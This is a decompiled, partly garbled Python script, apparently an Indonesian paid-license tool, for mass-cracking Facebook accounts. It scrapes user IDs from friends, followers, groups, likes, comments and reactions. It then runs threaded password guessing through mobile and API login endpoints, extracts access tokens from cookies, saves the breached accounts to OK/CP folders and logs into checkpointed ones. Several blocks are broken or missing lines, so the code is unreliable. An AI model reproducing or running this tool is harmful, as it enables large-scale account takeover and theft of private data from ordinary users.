#Cython English Version Decompiler 
#Decompile By Fall-Xavier 
# -*- coding: utf-8 
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json 
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser 
from datetime import datetime 
from urllib.parse import quote 
from datetime import date 
 
### GLOBAL WARNA ### 
P = '\x1b[1;97m' # PUTIH 
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU. 
K = '\x1b[1;93m' # KUNING. 
B = '\x1b[1;94m' # BIRU. 
U = '\x1b[1;95m' # UNGU. 
O = '\x1b[1;96m' # BIRU MUDA. 
N = '\x1b[0m'	# WARNA MATI 
USN="Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)" 
ses = requests.Session() 
loop = 0 
id = [] 
ok = [] 
cp = [] 
hasil = [] 
files = [] 
freetoken = [] 
id_group = [] 
komen = [] 
idteman = [] 
teman = [] 
munculapk = [] 
save = [] 
gab,exp,data_licensi = [],[],{} 
hasilcrack = [] 
ct = datetime.now() 
n = ct.month 
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"] 
try: 
	if n < 0 or n > 12: 
		exit() 
	nTemp = n - 1 
except ValueError:exit() 
current = datetime.now() 
ta = current.year 
bu = current.month 
ha = current.day 
op = bulan[nTemp] 
my_date = date.today() 
hr = calendar.day_name[my_date.weekday()] 
cv_hr = {"Sunday":"Minggu", "Monday":"Senin", "Tuesday":"Selasa", "Wednesday":"Rabu", "Thursday":"Kamis", "Friday":"Jumat", "Saturday":"Sabtu"} 
nama_hari = cv_hr[hr] 
tanggal = ("%s-%s-%s-%s"%(nama_hari, ha, op, ta));tgl = ("%s %s %s"%(ha, op, ta));bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"};bulan_x = {"january": "Januari", "february": "Februari", "march": "Maret", "april": "April", "may": "Mei", "june": "Juni", "july": "Juli", "august": "Agustus", "september": "September", "october": "Oktober", "november": "November", "december": "Desember"} 
try:ip = ses.get("http://ip-api.com/json/").json()["query"] 
except requests.exceptions.ConnectionError:exit(" [!] tidak ada koneksi internet") 
def jalan(z): 
	for e in z + '\n': 
		sys.stdout.write(e) 
		sys.stdout.flush() 
		time.sleep(0.03) 
def logo(): 
	os.system("clear") 
	print(f"""%s __________            _____ _____________________\n \____    /           /     \\______   \_   _____/ \n   /     /   ______  /  \ /  \|    |  _/|    __)  \n  /     /_  /_____/ /    Y    \    |   \|     \   \n /_______ \         \____|__  /______  /\___  /   \n         \/                 \/       \/     \/"""%(N)) 
def lisensi(): 
	logo() 
	print("-"*50) 
	print(" [+] lisensi : -") 
	print(f" [+] tanggal : {tgl}") 
	print(" [01]. sudah mempunyai lisensi") 
	print(" [02]. belum mempunyai lisensi") 
	print(" [03]. lihat akun hasil crack ") 
	pil = input(" [?] pilih menu : ") 
	if pil == "": 
		exit(" [!] pilih jawaban dengan benar") 
	if pil == "1": 
		key = input(" [+] masukan lisensi : ") 
		open("license.txt","w").write(key) 
		menu() 
	elif pil == "2": 
		cek_harga() 
	elif pil == "3": 
		lihathasil() 
	else: 
def cek_harga(): 
	print(" [1] 1 Bulan 50k") 
	print(" [2] 2 Bulan 100k") 
	print(" [3] 3 Bulan 150k") 
	asu = input(" [?] pilih :") 
	if asu in[""," "]: 
	elif asu in["1"]: 
		data = ("Assalamualaikum, saya ingin membeli lisensi 1 bulan").replace(' ','%20') 
		os.system('xdg-open https://wa.me/6282329761867?text=' +data) 
	elif asu in["2"]: 
		data = ("Assalamualaikum, saya ingin membeli lisensi 2 bulan").replace(' ','%20') 
	elif asu in["3"]: 
		data = ("Assalamualaikum, saya ingin membeli lisensi 3 bulan").replace(' ','%20') 
def login(): 
	ceklisen() 
	print(" [01]. login dengan token facebook") 
	print(" [02]. login dengan cookie facebook") 
	print(" [03]. login dengan email password") 
	print(" [04]. crack dari pencarian nama (no login)") 
	print(" [05]. token gratis (belum tentu selalu bisa)") 
	print(" [06]. lihat akun hasil crack ") 
	print(" [07]. hapus lisensi (premium)") 
	menu = input(" [?] pilih menu : ") 
	if menu in ["1", "01"]: 
		token = input(" [+] masukan token fb : ") 
		get_token(token) 
	elif menu in ["2", "02"]: 
		cookie = input(" [+] masukan cookie fb : ") 
		get_cookie(cookie) 
	elif menu in ["3", "03"]: 
		kredensial() 
	elif menu in ["4", "04"]: 
		pencarian_nologin() 
	elif menu in ["5", "05"]: 
		free_token() 
	elif menu in ["6", "06"]: 
	elif menu in ["7", "07"]: 
		ask = input(" [?] apakah kamu ingin menghapus lisensi? [Y/t]: ") 
		if ask in ["Y", "y"]: 
			os.system("rm -f license.txt") 
			exit(" [#] berhasil menghapus lisensi") 
		else:login() 
	else:login() 
def get_token(token): 
	try: 
		nama = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["name"] 
		open("token.txt", "w").write(token) 
		print("-"*50) 
		print(" [+] user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama)) 
		time.sleep(1) 
	except KeyError: 
		os.system("rm -f token.txt") 
		exit("\n [!] token kadaluwarsa") 
def get_cookie(cookie): 
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text) 
		nama = ses.get("https://graph.facebook.com/me?access_token="+find_token.group(1)).json()["name"] 
		open("token.txt", "w").write(find_token.group(1)) 
		open("cookie.txt", "w").write(cookie) 
	except Exception as e: 
		os.system("rm -f token.txt cookie.txt") 
		exit("\n [!] cookie kadaluwarsa") 
def free_token(): 
	num = 0 
	llink_token = ses.get("https://free.facebook.com/100001621584081/posts/5222617491135585/?app=fbl") 
	ttoken_free = re.findall("EAA\w+", llink_token.text) 
	for nnaa in ttoken_free: 
		num += 1 
		if len(nnaa)>=37: 
			freetoken.append(nnaa) 
			print(" [%s] %s%s%s"%(num,H,nnaa,N)) 
			print("-"*50) 
	pil = input("\n [?] pilih token untuk login : ") 
	if pil in[""," "]: 
		login() 
		tolkau = freetoken[int(pil)-1] 
		get_token(tolkau) 
		exit("%s"%(e)) 
def kredensial(): 
	user = input(" [+] email      : ") 
	pw = input(" [+] kata sandi : ") 
		url = "m.facebook.com" 
		header = {"Host":url,"upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"} 
		r = ses.get(f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header) 
		das = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"} 
		header1 = {"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"} 
		po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False) 
		if 'c_user' in ses.cookies.get_dict(): 
			headcok = {'Host': 'business.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8', 'content-type': 'text/html; charset=utf-8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'} 
			data2 = ses.get("https://business.facebook.com/business_locations", headers=headcok) 
			find_token = re.search('(EAAG\\w+)', data2.text) 
			token = find_token.group(1) 
			cookie = convert(ses.cookies.get_dict()) 
			open("cookie.txt", "w").write(cookie) 
			open("token.txt", "w").write(token) 
			if 'EAA' in token: 
				print("-"*50) 
				print(f" [+] token   : {token}") 
				print(f" [+] cookies : {cookie}") 
				time.sleep(5) 
				menu() 
		elif 'checkpoint' in ses.cookies.get_dict(): 
			exit(' [!] akun anda terkena checkpoint') 
		else: 
			exit("\n [!] email atau kata sandi salah") 
	except AttributeError: 
		exit("\n [!] email atau kata sandi salah") 
def convert(cookies): 
	cok = 'datr=' + cookies['datr'] + ';' + ('c_user=' + cookies['c_user']) + ';' + ('fr=' + cookies['fr']) + ';' + ('xs=' + cookies['xs']) 
	return cok 
def real_time(): 
	from time import time 
	return str(time()).split('.')[0] 
def ceklisen(): 
		apikey = open('license.txt', 'r').read() 
		aq = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIxMzE1MjY5NCIsIlZZZy9WWlhOdUs3Qmhkei9HblI2T3JoWkdma01INUFRaFMzeW5KQ0giXQ==&ProductId=14010&Key=%s' % apikey) 
		aw = json.loads(aq.text);key = aw['licenseKey'];bergabung = key['created'][:10];year,month,day = bergabung.split("-");month11 = bulan_ttl[month];kadaluwarsa = key['expires'][:10];year2,month2,day2 = kadaluwarsa.split("-");month22 = bulan_ttl[month2];cos = key['customer'];email = cos['email'];nama = cos['name'] 
	except (KeyError, IOError): 
		jalan(' %s[!] maaf lisensi anda tidak valid, silahkan ganti' % M) 
		try:os.remove('license.txt') 
		except:pass 
		lisensi() 
	file2 = (f"{day2}{month2}{year2}") 
	file3 = (f"{ha}{bu}{ta}") 
	date_format = "%d%m%Y" 
	b = datetime.strptime(file2, date_format) 
	c = datetime.strptime(file3, date_format) 
	delta = b - c 
	print(" Nama        : %s"%(nama)) 
	print(" Email       : %s"%(email)) 
	print(" Bergabung   : %s %s %s"%(day,month11,year)) 
	print(" Kadaluwarsa : %s %s %s"%(day2,month22,year2)) 
	print(" Sisa Lisensi: %s hari lagi"%(delta.days)) 
def menu(): 
		token = open("token.txt","r").read() 
	except FileNotFoundError: 
		print(" [!] akun anda terkena checkpoint") 
		nama = ses.get("https://graph.facebook.com/me/?access_token="+token).json()["name"] 
		uid = ses.get("https://graph.facebook.com/me/?access_token="+token).json()["id"] 
		ttl = ses.get("https://graph.facebook.com/me/?access_token="+token).json()["birthday"] 
		#nama = ses.get("https://graph.facebook.com/me/?access_token="+token).json()["name"] 
	except (KeyError,IOError): 
	except requests.exceptions.ConnectionError: 
		exit(" [!] tidak ada koneksi internet") 
	print(" ID          : %s"%(uid)) 
	print(" Tgl Lahir   : %s"%(ttl)) 
	print(" [01]. crack dari pencarian nama (no login)") 
	print(" [02]. crack dari id publik") 
	print(" [03]. crack dari id massal") 
	print(" [04]. crack dari followers") 
	print(" [05]. crack dari like post") 
	print(" [06]. crack dari komentar") 
	print(" [07]. crack dari member grup") 
	print(" [08]. crack dari reaction post") 
	print(" [09]. crack dari saran teman") 
	print(" [10]. crack dari komentar postingan") 
	print(" [11]. crack dari permintaan pertemanan") 
	print(" [12]. crack dari teman dari teman publik") 
	print(" [13]. ambil info daftar teman") 
	print(" [14]. lihat akun hasil crack") 
	print(" [15]. cek opsi hasil crack") 
	print(" [16]. hapus lisensi (premium)") 
	print(" [00]. logout (hapus cookie)") 
	angga = input(" [?] pilih menu : ") 
	if angga in ["1", "01"]: 
	elif angga in ["2", "02"]: 
		publik(token) 
		atursandi() 
	elif angga in ["3", "03"]: 
		massal(token) 
	elif angga in ["4", "04"]: 
		follower(token) 
	elif angga in ["5", "05"]: 
		like(token) 
	elif angga in ["6", "06"]: 
		komentar() 
	elif angga in ["7", "07"]: 
		pilgrup() 
	elif angga in ["8", "08"]: 
		reaction() 
	elif angga in ["9", "09"]: 
		saranteman() 
	elif angga in ["10"]: 
	elif angga in ["11"]: 
		permintaanteman() 
	elif angga in ["12"]: 
		temandariteman(token) 
	elif angga in ["13"]: 
		cek_jumlahtmn(token) 
	elif angga in ["14"]: 
	elif angga in ["15"]: 
		cek_opsi() 
	elif angga in ["16"]: 
		else:menu() 
	elif angga in ["0", "00"]: 
		ask = input(" [?] apakah kamu yakin ingin keluar? [Y/t]: ") 
			try: 
				cok = open("cookie.txt").read() 
				os.system("rm -f token.txt cookie.txt") 
				exit(" [#] berhasil hapus cookie dan token") 
			except IOError: 
				os.system("rm -f token.txt") 
				exit(" [#] berhasil hapus token") 
	else:menu() 
def temandariteman(token): 
	tt = [] 
	te = [] 
	idz = [] 
	no = 0 
	print(" [*] isi 'me' jika ingin lihat jumlah teman") 
	user = input(" [+] masukan username atau id : ") 
	if user in [""]:exit("\n [!] mohon isi yang benar jangan kosong") 
	elif user in ["me"]:idt = "me" 
	elif(re.findall("\w+",user)): 
		r = ses.get("https://m.facebook.com/"+user).text 
		try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0] 
		except:exit("\n [!] akun tidak tersedia atau list teman private") 
	try:limit = int(input(" [?] masukan limit id (cth:1000) : ")) 
	except ValueError:exit("\n [!] masukan angka yang benar") 
	for ids in tt: 
		no +=1 
		idz.append(ids) 
		try: 
			for b in ses.get(f"https://graph.facebook.com/{ids}?fields=friends.fields(id,name)&access_token={token}").json()["friends"]["data"]: 
				te.append(b["id"]) 
			print(" [%s]. %s|%s teman"%(str(no), ids, len(te))) 
			te.clear() 
		except KeyError: 
			pass 
	ask = input(" [?] pilih target : ") 
	if ask in[""]: 
			for i in ses.get(f"https://graph.facebook.com/{idz[int(ask)-1]}?fields=friends.fields(id,name)&access_token={token}").json()["friends"]["data"]: 
				id.append(i["id"]+"<=>"+i["name"]) 
		except Exception as e:exit("%s"%(e)) 
		if len(id) == 0:exit("\n [!] akun tidak tersedia atau list teman private") 
#### TEMAN PENCARIAN NAMA NO LOGIN #### 
def pencarian_nologin(): 
	jum = int(input(" [?] masukan jumlah target : ")) 
	for t in range(jum): 
		t +=1 
		idt = input(f" [+] masukan nama pencarian {H}{t}{N} : ") 
		dump_pencarian(f"https://mbasic.facebook.com/public/{idt}?/locale2=id_ID") 
	atursandi() 
def dump_pencarian(link): 
	r = parser(ses.get(str(link)).text,'html.parser') 
	for x in r.find_all('td'): 
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x)) 
		for uid,nama in data: 
			if 'profile.php?' in uid: 
				uid = re.findall('id=(.*)',str(uid))[0] 
			elif '<span' in nama: 
				nama = re.findall('(.*?)\<',str(nama))[0] 
			id.append(uid+'<=>'+nama) 
		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href') 
		if(link): 
			#print('\r [*] sedang mengumpulkan %s id...'%(len(id))) 
			dump_pencarian(link) 
	except: 
		pass 
#### CRACK TEMAN #### 
def publik(token): 
	print(" [*] isi 'me' jika ingin crack dari daftar teman") 
		except:idt = user 
#### CRACK MASSAL #### 
def massal(token): 
	try:tanya_total = int(input(" [+] masukan jumlah target : ")) 
	except:tanya_total=1 
	for t in range(tanya_total): 
		user = input(f" [+] masukan username atau id {H}{t}{N} : ") 
		if(re.findall("\w+",user)): 
			r = ses.get("https://m.facebook.com/"+user).text 
			try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0] 
			except:idt = user 
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=friends.fields(id,name)&access_token={token}").json()["friends"]["data"]: 
		except KeyError:print(" [!] akun tidak tersedia atau list teman private") 
	if len(id) == 0:print("\n [!] akun tidak tersedia atau list teman private") 
#### CRACK FOLLOWERS #### 
def follower(token): 
	print(" [*] isi 'me' jika ingin crack dari pengikut sendiri") 
		for i in ses.get("https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s"%(idt, token)).json()["data"]: 
			id.append(i["id"]+"<=>"+i["name"]) 
	except KeyError:exit("\n [!] akun tidak tersedia atau list followers private") 
	if len(id) == 0:exit("\n [!] akun tidak tersedia atau list followers private") 
#### CRACK LIKE POST #### 
def like(token): 
	idt = input(" [?] masukan id postingan : ") 
		for i in ses.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]: 
	except KeyError:exit("\n [!] post tidak tersedia atau tidak ada yang menanggapi") 
	if len(id) == 0:exit("\n [!] post tidak tersedia atau tidak ada yang menanggapi") 
#### CRACK KOMENTAR #### 
def komentar(): 
		cok = open("cookie.txt").read() 
		idg = input(" [?] masukan id postingan : ") 
		print(" [!] untuk berhenti tekan ctrl+c di keyboard anda") 
		url = "https://mbasic.facebook.com/"+idg 
		print("") 
		dump_komentar(url) 
	except IOError:exit(" [!] anda harus logout dulu dan masuk menggunakan cookie") 
def dump_komentar(url): 
	cok = open("cookie.txt").read() 
	kue = {"cookie":cok} 
	urlmain = ses.get(url,cookies=kue).text.encode("utf-8") 
	par = parser(urlmain,'html.parser') 
		for xf in par.find_all('h3'): 
			for xx in xf.find_all('a',href=True): 
				try: 
					if "profile.php" in xx.get("href"): 
						z = xx.get("href").split('=')[1] 
						x = z.split('&')[0] 
						uid = xx.text 
						id.append(x+"<=>"+uid) 
						sys.stdout.write("\r [*] sedang mengumpulkan %s id..."%(len(id))); sys.stdout.flush() 
				except:pass 
		for n in par.find_all("a",href=True): 
			if "Lihat komentar lainnya" in n.text: 
				dump_komentar("https://mbasic.facebook.com/"+n.get("href")) 
	except KeyboardInterrupt: 
#### CRACK GRUP #### 
def pilgrup(): 
		kue = {"cookie":cok} 
		idg = input(" [+] masukan id group : ") 
		url_group = "https://mbasic.facebook.com/browse/group/members/?id="+idg 
		group(kue, url_group) 
def group(kue, url_group): 
		sop_dev = parser(ses.get(url_group, cookies=kue).content, "html.parser") 
		members = sop_dev.find("div", id="objects_container") 
		for dev in members.find_all("table"): 
			user_ = dev["id"].replace("member_", "") 
			nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0] 
			try:id.append(str(user_)+"<=>"+str(nama_)) 
			except:pass 
			sys.stdout.write("\r [*] sedang mengumpulkan %s id..."%(len(id))); sys.stdout.flush() 
		if "Lihat Selengkapnya" in str(sop_dev): 
			url = sop_dev.find("a", string="Lihat Selengkapnya")["href"] 
			url_grup = "https://mbasic.facebook.com"+url 
			group(kue, url_grup) 
	except:pass 
def cek_group(token): 
	for i in ses.get("https://graph.facebook.com/me/groups?access_token=%s"%(token)).json()["data"]: 
			id_group.append(i["id"]) 
			no +=1 
		print(" [%s]. %s"%(str(no), i["name"])) 
	for idg in id_group: 
			print("") 
			url_group = "https://mbasic.facebook.com/browse/group/members/?id="+idg 
			group(kue, url_group) 
		except KeyboardInterrupt:break 
#### CRACK REACTION #### 
def reaction(): 
		url = "https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier="+idg 
		dump_react(url) 
def dump_react(url): 
		cok = open('.cokie.txt').read() 
		cookie  = {"cookie":cok} 
		kontol=ses.get(url,cookies=cookie).text 
		if "Semua 0" in kontol: 
			exit(" [!] tidak ada yang menanggapi postingan") 
			memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol) 
			for softek in memek: 
				if "profile.php?" in softek[0]: 
					id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1]) 
				else: 
					id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1]) 
				sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush() 
			if "Lihat Selengkapnya" in kontol: 
				dump_react("https://mbasic.facebook.com/"+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href")) 
#### CRACK SARAN TEMAN #### 
def saranteman(): 
		url = "https://mbasic.facebook.com/friends/center/suggestions/?mff_nav=1" 
		req_fl(url) 
#### CRACK PERMINTAAN TEMAN ### 
def permintaanteman(): 
		url = "https://mbasic.facebook.com/friends/center/requests" 
def req_fl(url): 
	s = parser(ses.get(url, cookies=kue).text, "html.parser") 
		for x in s.find_all("a",href=True): 
			if "/friends/hovercard" in x.get('href'): 
				nama = x.text 
				idx = "".join(bs4.re.findall('uid=(.*?)&',x.get('href'))) 
				id.append(idx+"<=>"+nama) 
			else:pass 
			if "Lihat selengkapnya" in x.text: 
				req_fl("https://mbasic.facebook.com/"+x.get('href')) 
def cek_jumlahtmn(token): 
			exit("\n [!] akun facebook anda terkena spam") 
	print(" [*] lihat jumlah total teman sudah selesai") 
	input(" %s[*] tekan enter untuk kembali ke menu"%(N)) 
### CEK HASIL CRACK ### 
def lihathasil(): 
	print(' [1]. lihat hasil crack OK ') 
	print(' [2]. lihat hasil crack CP ') 
	print(' [3]. hapus hasil crack ') 
	anjg = input(' [?] pilih : ') 
	if anjg == '': 
	elif anjg == "1": 
		dirs = os.listdir("OK") 
		print(f" [+] terdapat total file : {len(dirs)}") 
		num = 0 
		for file in dirs: 
			num += 1 
			totalok = open("OK/%s"%(file)).read().splitlines() 
			print(f" [{str(num)}] {file} -> {len(totalok)}") 
			files.append(file) 
		print(" [+] ketik 'cp' untuk copy, 'all' untuk liat semua") 
		bngst = input(" [?] pilih lihat hasil yang mana : ") 
		if bngst == "": 
			menu() 
		elif bngst =="all": 
			hasil.append("ok") 
			cekmassal() 
		elif bngst =="cp": 
			salinhasil() 
			cekhasil(bngst) 
	elif anjg == "2": 
		dirs = os.listdir("CP") 
			totalcp = open("CP/%s"%(file)).read().splitlines() 
			print(f" [{str(num)}] {file} -> {len(totalcp)}") 
			hasil.append("cp") 
	elif anjg =="3": 
		print(" [1] hapus hasil crack OK") 
		print(" [2] hapus hasil crack CP") 
		ass = input(' [?] pilih : ') 
		if ass=="": 
		elif ass=="1": 
			os.system("rm -rf OK") 
			print(" [+] berhasil menghapus hasil OK") 
			input(f" {N}[+] tekan enter untuk kembali ke menu") 
		elif ass=="2": 
			os.system("rm -rf CP") 
			print("\n [+] berhasil menghapus hasil CP") 
def cekhasil(bngst): 
	if "ok" in hasil: 
			kontol = files[int(bngst)-1] 
			totalok = open("OK/%s"%(kontol)).read().splitlines() 
		except IOError: 
			exit(" [!] file %s tidak tersedia"%(kontol)) 
		nm_file = ("%s"%(kontol)).replace("-", " ") 
		del_txt = nm_file.replace(".txt", "") 
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalok))) 
		print("%s"%(H)) 
		os.system("cat OK/%s"%(kontol)) 
		input(f" {N}[+] tekan enter untuk kembali ke menu") 
	elif "cp" in hasil: 
			totalcp = open("CP/%s"%(kontol)).read().splitlines() 
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalcp))) 
		print("%s"%(K)) 
		os.system("cat CP/%s"%(kontol)) 
def salinhasil(): 
		os.system("cp -rf OK /sdcard") 
			print(" [+] berhasil mengcopy %s"%(file)) 
		os.system("cp -rf CP /sdcard") 
def cekmassal(): 
			nm_file = ("%s"%(file)).replace("-", " ") 
			del_txt = nm_file.replace(".txt", "") 
			print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalok))) 
			print("%s"%(H)) 
			os.system("cat OK/%s"%(file)) 
			print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalcp))) 
			print("%s"%(K)) 
			os.system("cat CP/%s"%(file)) 
### BAGIAN SANDI #### 
def atursandi(): 
	print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(id))) 
	ask=input(" [?] anda ingin menggunakan sandi manual? [Y/t]:") 
	if ask=="y": 
		sandimanual() 
	elif ask=="t": 
		sandiotomatis() 
		exit(" %s[!] pilih jawaban dengan benar!"%(M)) 
def setapk(): 
	ask = input(" [?] munculkan aplikasi yang terkait?[Y/t] : ") 
	if ask in["y","Y"]: 
		munculapk.append("y") 
### SANDI MANUAL ### 
def sandimanual(): 
	print(" [!] gunakan , (koma) untuk pemisah cth : sandi123,sandi12345") 
	pwek=input(' [?] masukan kata sandi : ') 
	print(' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)) 
	if pwek=="": 
		exit(" %s[!] isi jawaban dengan benar!"%(M)) 
	elif len(pwek)<=5: 
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M)) 
	print(" [1]. method API (fast)") 
	print(" [2]. method mbasic (slow)") 
	print(" [3]. method mobile (super slow)") 
	ask=input(" [?] pilih metode : ") 
	if ask=="": 
		print(' [+] hasil CP  -> CP/%s.txt' % (tanggal)) 
		with ThreadPoolExecutor(max_workers=30) as fall: 
			for user in id: 
				uid, name = user.split("<=>") 
				fall.submit(metode, uid, pwek.split(","),"free.facebook.com") 
		exit("\n\n [#] crack selesai...") 
	elif ask=="2": 
		print(' [+] hasil OK -> OK/%s.txt' % (tanggal)) 
### SANDI OTOMATIS ### 
def sandiotomatis(): 
	sanditam = input(" [?] ingin menambahkan kata sandi?[Y/t] : ") 
	if sanditam in["y","Y"]: 
		tam = input(" [+] sandi tambahan : ").split(",") 
	print(" [1]. metode API (fast)") 
	print(" [2]. metode mbasic (slow)") 
	print(" [3]. metode mobile (super slow)") 
	elif ask=="1": 
		print(' [+] hasil CP -> CP/%s.txt' % (tanggal)) 
				nam = name.split(' ') 
			elif 'checkpoint' in session.cookies.get_dict(): 
					tokenz = open('token.txt').read() 
					cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday'] 
					month, day, year = cp_ttl.split('/') 
	headers={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"} 
	__response = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cok},headers=headers).text 
	data = re.findall('\/>\<div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(__response)) 
	for nama,aktif in data: 
			nama = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(nama))[0] 
		except: 
		num+=1 
		print(f"\r  {H}[{str(num)}] {nama} : {aktif}{N}     ") 
	__response = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cok},headers=headers).text 
		print(f"\r  {M}[{str(num)}] {nama} : {aktif}{N}     ") 
def cp_opsi(): 
	print(" [!] jika anda ingin mengecek opsi checkpoint akun silakan hidupkan mode pesawat 5 detik.") 
	ask = input(" [?] apakah anda ingin cek opsi hasil crack [Y/t]: ") 
	if ask in ["Y", "y"]: 
		print(f" [+] total id -> {M}{len(cp)}{N}") 
		print(" [*] tunggu sebentar sedang proses masuk kedalam akun") 
		for memek in cp: 
			kontol = memek.replace("\n","") 
			titid  = kontol.split("|") 
			print(" [*] masuk ke akun : %s%s%s"%(K,kontol.replace("  * --> ",""),N)) 
			try:check_in(titid[0], titid[1]) 
			except requests.exceptions.ConnectionError:pass 
		exit("\n [#] cek akun sudah selesai...") 
	else:exit() 
def cek_opsi(): 
	print(" [*] masukan file (ex: CP/%s.txt)"%(tanggal)) 
	files = input(" [?] masukan file : ") 
	if files == "":menu() 
	try:buka_baju = open(files, "r").readlines() 
	except IOError:exit("\n [!] nama file %s tidak tersedia"%(files)) 
	print(f" [+] total id -> {M}{len(buka_baju)}{N}") 
	print(" [*] tunggu sebentar sedang proses masuk kedalam akun") 
	for memek in buka_baju: 
		kontol = memek.replace("\n","") 
		titid  = kontol.split("|") 
		print(" [*] masuk ke akun : %s%s%s"%(K,kontol.replace("  * --> ",""),N)) 
		try:check_in(titid[0].replace("  * --> ",""), titid[1]) 
		except requests.exceptions.ConnectionError:pass 
